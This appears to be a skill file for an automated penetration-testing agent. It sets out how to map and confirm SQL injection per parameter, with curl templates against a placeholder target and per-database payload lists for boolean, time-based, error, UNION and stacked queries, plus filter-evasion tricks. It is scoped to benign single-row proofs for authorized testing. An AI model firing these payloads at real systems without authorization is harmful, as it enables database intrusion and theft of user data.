---
name: sqli_context_map
agent: agent5_injection
description: Context-aware SQL injection testing — error-based vs blind vs time-based per parameter, with DBMS fingerprinting and safe canaries before any proof.
---

# SQLi Context Map

## Purpose

Maps every injectable parameter to its injection context (error-based, blind boolean, time-based, stacked, UNION-capable) before a single exploit is attempted. Most SQLi hunting fails because testers fire UNION payloads at blind contexts and conclude "not vulnerable." Context mapping first, exploitation second. Real impact: authentication bypass, full database exfiltration (emails, password hashes, PII), and in rare stacked-query contexts, OS command execution via the database engine.

## Division of labor

- **Consumes:** endpoint + parameter inventory from `agent2_mapping` (e.g. `endpoints/parameters.md` — URL, method, parameter names, types), session-free baseline evidence from `agent1_recon`.
- **Produces:** `findings/sqli_context_map.md` — per-parameter verdict table (CONFIRMED / INCONCLUSIVE / NEGATIVE) with context classification and raw request/response pairs. This is the finished artifact. Nothing downstream acts on SQLi without this file.

## When to use / when NOT to use

- **Use when:** parameters flow into anything that smells like a query — search boxes, filters, sort/order-by fields, IDs, login forms, "remember me" cookies, pagination offsets, API `?filter=` / `?q=` arguments.
- **Skip when (time-pass filter):** the parameter is echoed into a static page with no database evidence and no error delta; the endpoint is behind authentication you do not have (log it as a note, don't burn time); the only "delta" you can produce is timing noise you cannot reproduce twice.

## Methodology

1. **Inventory injection points.** From the parameter inventory, list every GET parameter, POST body field, cookie, and header (`X-Forwarded-For`, `User-Agent`, `Referer`, `Accept-Language`) that the app touches. Cookies and headers are where blind SQLi hides.
2. **Establish the 404/valid baseline.** Record one known-good response (valid ID → 200 with data) and one known-dead response (impossible ID like `-99999999` or a random UUID → 404/empty). Save both full bodies. Every later verdict is a diff against these.
3. **Fire the neutral canary trio first.** For each parameter send `'` then `"` then `\` — alone, no payloads. Look for: 500 with SQL error text (error-based context), identical 200 but different content length (blind context), or nothing at all (filtered/escaped — NEGATIVE unless later steps prove otherwise).
4. **Classify error text into DBMS.** MySQL: `You have an error in your SQL syntax`; `mysql_fetch`. PostgreSQL: `PG::SyntaxError`, `unterminated quoted string`. MSSQL: `Unclosed quotation mark`, `ODBC SQL Server Driver`. Oracle: `ORA-01756`, `quoted string not properly terminated`. SQLite: `unrecognized token`. Record the DBMS — it chooses every later payload.
5. **Error-based ladder (only if step 3 produced SQL errors).** Confirm with `AND 1=1` vs `AND 1=2` on a numeric parameter, or `' AND '1'='1` vs `' AND '1'='2` on strings. If the page changes between the two, you have confirmed boolean-blind at minimum. Escalate to `ORDER BY` column counting, then `UNION SELECT` with NULL count matching, then version/user extraction via `@@version` / `version()` / `user`.
6. **Blind boolean mapping (no errors visible).** Use content-based boolean: `AND 1=1` (page == valid baseline) vs `AND 1=2` (page == dead baseline). If both look identical, try `AND (SELECT 1 FROM ...)`-style payloads that change row counts — compare against the dead baseline, not against "looks different."
7. **Time-based confirmation (no content delta).** `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND SLEEP(5)-- -` (MySQL), `' AND pg_sleep(5)--` (PostgreSQL). Measure with `curl -w '%{time_total}'`. Require ≥4.5s delay reproduced twice, and a control request with `SLEEP(0)` / `pg_sleep(0)` that returns fast. Timing noise without a control is INCONCLUSIVE, never CONFIRMED.
8. **DBMS fingerprint confirmation.** MySQL: `AND @@version LIKE '8%'`. PostgreSQL: `AND version() LIKE 'PostgreSQL%'`. MSSQL: `AND @@version LIKE 'Microsoft%'`. Oracle: `AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE 'Oracle%'`. One of these must return the valid-baseline page for a CONFIRMED fingerprint.
9. **Safe exploitation proof (benign single-row read only).** Extract exactly one benign row: database name, version string, current user. Example: `' UNION SELECT NULL,version(),NULL-- -` after column-count confirmation. Never dump tables, never extract password hashes — proof of read is enough for the report.
10. **WAF/filter evasion (only after a NEGATIVE that smells wrong).** Try: keyword splitting (`SEL/**/ECT`), case variation (`uNiOn`), double-URL-encoding, inline comments (`/*!50000SELECT*/` on MySQL), and stacked-context retest. Each evasion attempt is logged with its response; a bypass that changes nothing is still NEGATIVE.
11. **Second-order check.** If an input is stored (profile fields, comments) and rendered elsewhere (admin panel, search results), test the *rendering* endpoint for the SQL error / boolean delta, not just the submit endpoint.
12. **Stacked query probe (MSSQL/PostgreSQL only, last).** `'; SELECT pg_sleep(3);--` — if the delay fires where `AND pg_sleep(3)` did not, you have stacked-query context. Do not execute anything beyond the sleep.
13. **Verdict per parameter.** CONFIRMED / INCONCLUSIVE / NEGATIVE with the exact raw pairs. A parameter is NEGATIVE only after steps 3–7 and 10 all ran.
14. **Chain check.** Any CONFIRMED SQLi gets a one-line chain note: can it reach the auth table? the admin panel? credential reset? Hand the chain to `agent9_chaining`.

## Exact commands

Baseline (known-good vs known-dead):
```bash
curl -s -o good.html -w 'GOOD %{http_code} %{size_download}\n' '<TARGET>/item?id=42'
curl -s -o dead.html -w 'DEAD %{http_code} %{size_download}\n' '<TARGET>/item?id=-99999999'
diff <(wc -c < good.html) <(wc -c < dead.html)
```

Canary trio:
```bash
for p in "'" '"' "\\"; do
  echo "=== canary: $p ==="
  curl -s -o /dev/null -w '%{http_code} %{size_download}\n' --get '<TARGET>/item' --data-urlencode "id=42${p}"
done
```

Boolean-blind pair (string context):
```bash
curl -s -o b1.html -w 'TRUE %{http_code} %{size_download}\n' --get '<TARGET>/item' --data-urlencode "id=42' AND '1'='1"
curl -s -o b2.html -w 'FALSE %{http_code} %{size_download}\n' --get '<TARGET>/item' --data-urlencode "id=42' AND '1'='2"
diff b1.html b2.html && echo SAME || echo DIFFERENT
```

Time-based with control (MySQL example):
```bash
curl -s -o /dev/null -w 'sleep5: %{time_total}s\n' --get '<TARGET>/item' --data-urlencode "id=42' AND SLEEP(5)-- -"
curl -s -o /dev/null -w 'sleep0: %{time_total}s\n' --get '<TARGET>/item' --data-urlencode "id=42' AND SLEEP(0)-- -"
curl -s -o /dev/null -w 'clean:  %{time_total}s\n' --get '<TARGET>/item' --data-urlencode 'id=42'
```

DBMS fingerprint + benign single-row proof:
```bash
curl -s --get '<TARGET>/item' --data-urlencode "id=42' UNION SELECT NULL,version(),NULL-- -" | grep -oiE 'mysql|mariadb|postgresql|[0-9]+\.[0-9]+\.[0-9]+' | head -5
```

Cookie/header injection points:
```bash
curl -s -o /dev/null -w 'cookie: %{http_code} %{size_download}\n' -b "session=abc' AND SLEEP(3)-- -" '<TARGET>/dashboard'
curl -s -o /dev/null -w 'ua: %{http_code} %{size_download}\n' -A "x' AND SLEEP(3)-- -" '<TARGET>/'
```

## DBMS payload reference

Use the fingerprinted DBMS — never fire MySQL payloads at a PostgreSQL context.

**MySQL / MariaDB:**
- Boolean: `' AND 1=1-- -` vs `' AND 1=2-- -` (note the `-- -` needs the trailing space or use `#`)
- Time: `' AND SLEEP(5)-- -` / control `' AND SLEEP(0)-- -`
- Error-based: `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -`
- UNION recon: `' ORDER BY 1-- -` increment until error, then `' UNION SELECT NULL,NULL,version()-- -`
- Version/user: `@@version`, `user()`, `database()`

**PostgreSQL:**
- Boolean: `' AND 1=1--` vs `' AND 1=2--` (`--` to end of line, no trailing space needed)
- Time: `' AND pg_sleep(5)--` / control `' AND pg_sleep(0)--`
- Error-based: `' AND 1=CAST((SELECT version()) AS INT)--`
- Stacked: `'; SELECT pg_sleep(5)--` — if this fires where inline did not, stacked context confirmed
- Version/user: `version()`, `current_user`, `current_database()`

**MSSQL:**
- Boolean: `' AND 1=1--` vs `' AND 1=2--`
- Time: `'; WAITFOR DELAY '0:0:5'--` / control `'; WAITFOR DELAY '0:0:0'--`
- Error-based: `' AND 1=CONVERT(INT,(SELECT @@version))--`
- Stacked: `'; SELECT 1; WAITFOR DELAY '0:0:3'--`
- Version/user: `@@version`, `SYSTEM_USER`, `DB_NAME()`

**Oracle:**
- Boolean: `' AND 1=1--` vs `' AND 1=2--` (every SELECT needs `FROM dual` in UNION probes)
- Time: `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--` / control with `0`
- Error-based: `' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--`
- Version: `(SELECT banner FROM v$version WHERE ROWNUM=1)`

**SQLite:**
- Boolean: `' AND 1=1--` vs `' AND 1=2--`
- Time: no SLEEP — use heavy-query timing: `' AND (SELECT COUNT(*) FROM sqlite_master AS a, sqlite_master AS b, sqlite_master AS c)--` vs a light query; require 2x + control
- Version: `sqlite_version()`

## Completion-bias defenses

- [ ] Every parameter from the inventory has a row in the verdict table — no parameter skipped
- [ ] Known-good and known-dead baselines saved before any probe
- [ ] Canary trio fired on GET, POST, cookie, and at least two headers per parameter-bearing endpoint
- [ ] DBMS identified by error text or fingerprint probe, not guessed
- [ ] Boolean pair compared against dead baseline, not "looks different"
- [ ] Every time-based claim has a SLEEP(0) control and a clean request timing
- [ ] WAF evasion attempted before any NEGATIVE verdict on a suspicious parameter
- [ ] Second-order rendering endpoint checked where input is stored
- [ ] Benign single-row proof captured (version/db/user) — no table dumps
- [ ] Raw request/response pairs saved for every CONFIRMED and INCONCLUSIVE
- [ ] `findings/sqli_context_map.md` exists on disk with the full verdict table
- **Review step:** agent10_review must verify (a) each CONFIRMED has the boolean pair diff or the 2x timed reproduction with control, (b) the DBMS fingerprint matches the payloads used, (c) no table content beyond version/user/db-name was extracted.
- **Nudge prompts:**
  - "Keep going until every parameter — including cookies and headers — has a verdict row, not just the search box."
  - "A timing delta without a SLEEP(0) control is noise. Re-run with the control before you claim anything."
  - "Do not report done before findings/sqli_context_map.md exists on disk with raw pairs attached."
- **Finished artifact definition:** `findings/sqli_context_map.md` — per-parameter table (parameter, location, context type, DBMS, verdict, proof payload) + raw request/response pairs for CONFIRMED/INCONCLUSIVE.

## Evidence standard

- Baseline: known-good vs known-dead response saved before probing; every boolean claim is a diff against the dead baseline.
- Reproduction: error-based and boolean hits reproduced 2x; time-based hits need 2x delayed + 1x fast control.
- Raw evidence: full request (method, path, encoded parameter) and full response (status, length, relevant excerpt) saved.
- Verdicts: CONFIRMED (all three met) / INCONCLUSIVE (delta seen once, or timing without clean control — needs second model run or human) / NEGATIVE (full ladder ran, no delta — documented with the exact payloads tried).

## Handoffs

- `agent9_chaining`: consumes CONFIRMED rows — chains SQLi into auth bypass, admin access, or credential extraction; needs the parameter, exact context type, and DBMS.
- `agent7_bypass`: consumes WAF-evasion notes — applies the same filter behavior to other input classes.
- `agent10_review`: consumes `findings/sqli_context_map.md` — verifies evidence standard before any report ships.
